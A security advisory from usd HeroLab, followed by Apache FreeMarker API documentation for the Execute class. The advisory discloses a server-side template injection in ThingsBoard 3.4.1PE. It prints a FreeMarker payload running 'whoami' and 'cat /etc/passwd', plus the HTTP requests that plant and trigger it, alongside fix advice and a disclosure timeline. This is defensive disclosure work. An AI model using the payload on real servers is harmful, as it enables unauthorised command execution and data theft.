=== Content from herolab.usd.de_89ea1433_20250111_154135.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0010/ "English")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0010/ "English")

# usd-2023-0010 | SSTI in ThingsBoard v.3.4.1PE

#

**Advisory ID**: usd-2023-0010
**Product**: ThingsBoard UI
**Affected Version**: v.3.4.1PE
**Vulnerability Type**: SSTI
**Security Risk**: High (CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H)
**Vendor URL**: https://thingsboard.io/
**Vendor Status**: Fixed
**CVE number**: Pending
**CVE Link**: Pending
**Last Update**: 2023-08-29

### Desciption

ThingsBoard is an open-source IoT platform for data collection, processing, visualization, and device management.
During an assessment a server-side template injection (SSTI) vulnerability was discovered.
Thingsboard uses templates in the automated generation of mail content.
The structure of the document is specified by a template into which the data is inserted dynamically.
Many template languages have additional features, such as performing calculations, processing logical operations directly in the template, or even executing operating system commands.

If templates can be dynamically created and modified by attackers, this poses a high risk to the confidentiality and integrity of the application.
Thingsboards UI uses Apache Freemarker which is considered as turing-complete and allows executing commands on the system level.

### Proof of Concept

It was discovered that users with permissions to modify the email templates are able to execute arbitrary commands on the underlying system.
A user needs to modify the default templates and inject a template variable which executes a command. After sending the email the command is executed and the output is embedded into the mail.

As shown at https://portswigger.net/research/server-side-template-injection an Apache Freemarker command execution is possible.
To execute **whoami** the following content must be inserted into the template: **<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami)}**.
In the section *White Labeling* => *Mail Templates* the existing mail templates can be modified.
The following listing shows the request with the modified mail body.

```
POST /api/admin/settings HTTP/1.1
Host: thingsboard.local
Cookie: [SESSION_COOKIE]
Content-Length: 34715
Content-Type: application/json
X-Authorization: Bearer [JWT]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close

{
  "id": null,
  "createdTime": 0,
  "tenantId": {
    "entityType": "TENANT",
    "id": "43ee4ed0-ccf0-11ea-8c84-731415dbf7ca"
  },
  "key": "mailTemplates",
  "jsonValue": {
    "test": {
      "subject": "Test message from ThingsBoard",
      "body": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"cat /etc/passwd\")}<table class=\"main\" style=\"font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; box-sizing: border-box; border-radius: 3px; width: 100%; background-color: #f6f6f6; margin: 0px auto;\" cellspacing=\"0\" cellpadding=\"0\" bgcolor=\"#f6f6f6\">\n<tbody>\n<tr style=\"box-sizing: border-box; margin: 0px;\">\n<td class=\"content-wrap\" style=\"box-sizing: border-box; vertical-align: top; margin: 0px; padding: 20px;\" align=\"center\" valign=\"top\">\n<table style=\"box-sizing: border-box; border: solid 1px #e9e9e9; border-radius: 3px; margin: 0px; height: 127px; padding: 20px; background-color: #ffffff; width: 600px; max-width: 600px !important;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr style=\"box-sizing: border-box; margin: 0px;\">\n<td class=\"content-block\" style=\"color: #348eda; box-sizing: border-box; border-radius: 6px; vertical-align: top; margin: 0px; padding: 0px 0px 20px; width: 839px;\" valign=\"top\">\n<h2>Test message from ThingsBoard</h2>\n</td>\n</tr>\n<tr style=\"box-sizing: border-box; margin: 0px;\">\n<td class=\"content-block\" style=\"box-sizing: border-box; vertical-align: top; margin: 0px; padding: 0px 0px 20px; width: 600px;\" valign=\"top\">\n<p><span style=\"color: #000000;\">This email is indicating that your outgoing mail settings were set up correctly.&nbsp;</span></p>\n<p>&nbsp;</p>\n</td>\n</tr>\n<tr style=\"box-sizing: border-box; margin: 0px;\">\n<td class=\"content-block\" style=\"box-sizing: border-box; vertical-align: top; margin: 0px; padding: 0px 0px 20px; width: 600px;\" valign=\"top\"><span style=\"color: #000000;\">&mdash; The ThingsBoard</span></td>\n</tr>\n</tbody>\n</table>\n</td>\n</tr>\n</tbody>\n</table>\n<table style=\"color: #999999; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 14px; box-sizing: border-box; margin: 0px auto; height: 64px; background-color: #f6f6f6; width: 100%;\" cellpadding=\"0px 0px 20px\">\n<tbody>\n<tr style=\"box-sizing: border-box; margin: 0px;\">\n<td class=\"aligncenter content-block\" style=\"box-sizing: border-box; font-size: 12px; margin: 0px; padding: 0px 0px 20px; width: 600px; text-align: center; vertical-align: middle;\" align=\"center\" valign=\"top\">This email was sent to&nbsp;<a style=\"box-sizing: border-box; color: #999999; margin: 0px;\" href=\"mailto:${targetEmail}\">${targetEmail}</a>&nbsp;by ThingsBoard.</td>\n</tr>\n</tbody>\n</table>"
    },
[...]

```

After the template was modified and the template injection payload was inserted in the first line of the body, it is nececassary to trigger the mail content creation.
The modified template was used for test messages.
A test message can be sent by performing the following request.

```
POST /api/admin/settings/testMail HTTP/1.1
Host: thingsboard.local
Cookie: [SESSION_COOKIE]
Content-Length: 397
Content-Type: application/json
X-Authorization: Bearer [JWT]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close

{"id":null,"createdTime":0,"tenantId":null,"key":"mail","jsonValue":{"useSystemMailSettings":false,"mailFrom":"localhost","smtpProtocol":"smtp","smtpHost":"localhost","smtpPort":"25","timeout":"10000","enableTls":false,"tlsVersion":null,"enableProxy":null,"proxyHost":null,"proxyPort":null,"proxyUser":null,"proxyPassword":null,"username":null}}

```

The mail address of the authenticated user receives a mail afterwards.
In the mail body the first line of the body contains the content of the **/etc/passwd** proofing that command execution is possible.

![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/08/ssti_passwd.png)

### Fix

It is recommended to define templates statically wherever possible.
If templates are generated dynamically based on user input, it must be ensured that attackers cannot inject any template commands or meta characters.
For this purpose, user input should be masked before it is inserted into the template.
It is also recommended to use templating engines that are not touring complete to separate the template engine and underlying system.

### References

https://portswigger.net/research/server-side-template-injection

### Timeline

* **2023-04-20**: First contact request via contact form
* **2023-04-20**: Fix was announced for upcoming 3.5 release
* **2023-05-11**: ThingsBoard 3.5 was released

### Credits

This security vulnerability was identified by Gerbert Roitburd of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

[Kontakt](https://www.usd.de/kontakt/)
[Impressum](https://www.usd.de/impressum/)
[Datenschutz](https://www.usd.de/datenschutz/)
[AGB](https://www.usd.de/allgemeine-geschaeftsbedingungen-beratung/)

© 2023 usd AG

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/the-security-risks-of-overlong-utf-8-encodings/)

Sep. 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories zu hugocms und Gitea](https://herolab.usd.de/security-advisories-zu-hugocms-und-gitea/)

Juli 25, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests hugocms und Gitea untersucht. Dabei wurden mehrere Schwachstellen auf den verschiedenen Anwendungen identifiziert. Die Schwachstelle wurde dem Hersteller im Rahmen der Responsible...

## [Security Advisory zu AXIS Webcam](https://herolab.usd.de/security-advisory-zu-axis-webcam/)

Juli 1, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests die AXIS Webcam (P1364) untersucht. Unsere Professionals entdeckten eine Sicherheitslücke (Cross-Site Request Forgery) im Adminpanel der AXIS P1364 Webcam. Das Ausnutzen dieser...

#### Folgen Sie uns

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-x.svg)](https://twitter.com/usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-instagram.svg)](https://www.instagram.com/usdhero/)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/company/usdag/?originalSubdomain=de)

[Meldung einer Schwachstelle oder eines Bugs](https://www.usd.de/meldung-bug-oder-schwachstelle/)

[Code of Ethics](/code-of-ethics/)



=== Content from freemarker.apache.org_53fc56a2_20250111_154133.html ===


JavaScript is disabled on your browser.

[Skip navigation links](#skip.navbar.top "Skip navigation links")

* [Overview](../../../index.html)
* [Package](package-summary.html)
* Class
* [Tree](package-tree.html)
* [Deprecated](../../../deprecated-list.html)
* [Index](../../../index-all.html)
* [Help](../../../help-doc.html)

* Summary:
* Nested |
* [Field](#field.summary) |
* [Constr](#constructor.summary) |
* [Method](#method.summary)

* Detail:
* Field |
* [Constr](#constructor.detail) |
* [Method](#method.detail)

SEARCH:

Package [freemarker.template.utility](package-summary.html)
# Class Execute

[java.lang.Object](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html "class or interface in java.lang")
freemarker.template.utility.Execute

All Implemented Interfaces:
`[TemplateMethodModel](../TemplateMethodModel.html "interface in freemarker.template")`, `[TemplateModel](../TemplateModel.html "interface in freemarker.template")`

---

public class Execute
extends [Object](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html "class or interface in java.lang")
implements [TemplateMethodModel](../TemplateMethodModel.html "interface in freemarker.template")

Gives FreeMarker the the ability to execute external commands. Will fork
a process, and inline anything that process sends to stdout in the template.
Based on a patch submitted by Peter Molettiere.

BE CAREFUL! this tag, depending on use, may allow you
to set something up so that users of your web
application could run arbitrary code on your server.
This can only happen if you allow unchecked GET/POST
submissions to be used as the command string in the
exec tag.

Usage:

From java:

```

 SimpleHash root = new SimpleHash();

 root.put( "exec", new freemarker.template.utility.Execute() );

 ...

```

From your FreeMarker template:

```

 The following is executed:
 ${exec( "/usr/bin/ls" )}

 ...

```

* ## Field Summary

  ### Fields inherited from interface freemarker.template.[TemplateModel](../TemplateModel.html "interface in freemarker.template")

  `[NOTHING](../TemplateModel.html#NOTHING)`
* ## Constructor Summary

  Constructors
  Constructor
  Description
  `[Execute](#%3Cinit%3E())()`
* ## Method Summary

  All MethodsInstance MethodsConcrete Methods
  Modifier and Type
  Method
  Description
  `[Object](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html "class or interface in java.lang")`
  `[exec](#exec(java.util.List))​([List](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/util/List.html "class or interface in java.util") arguments)`
  Executes a method call.

  ### Methods inherited from class java.lang.[Object](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html "class or interface in java.lang")

  `[clone](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#clone() "class or interface in java.lang"), [equals](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#equals(java.lang.Object) "class or interface in java.lang"), [finalize](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#finalize() "class or interface in java.lang"), [getClass](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#getClass() "class or interface in java.lang"), [hashCode](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#hashCode() "class or interface in java.lang"), [notify](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#notify() "class or interface in java.lang"), [notifyAll](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#notifyAll() "class or interface in java.lang"), [toString](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#toString() "class or interface in java.lang"), [wait](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#wait() "class or interface in java.lang"), [wait](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#wait(long) "class or interface in java.lang"), [wait](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html#wait(long,int) "class or interface in java.lang")`

* ## Constructor Details

  + ### Execute

    public Execute()
* ## Method Details

  + ### exec

    public [Object](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/lang/Object.html "class or interface in java.lang") exec​([List](https://docs.oracle.com/en/java/javase/16/docs/api/java.base/java/util/List.html "class or interface in java.util") arguments)
    throws [TemplateModelException](../TemplateModelException.html "class in freemarker.template")
    Executes a method call.
    Specified by:
    `[exec](../TemplateMethodModel.html#exec(java.util.List))` in interface `[TemplateMethodModel](../TemplateMethodModel.html "interface in freemarker.template")`
    Parameters:
    `arguments` - a `List` of `String` objects containing the values
    of the arguments passed to the method.
    Returns:
    the `TemplateModel` produced by the method, or null.
    Throws:
    `[TemplateModelException](../TemplateModelException.html "class in freemarker.template")`


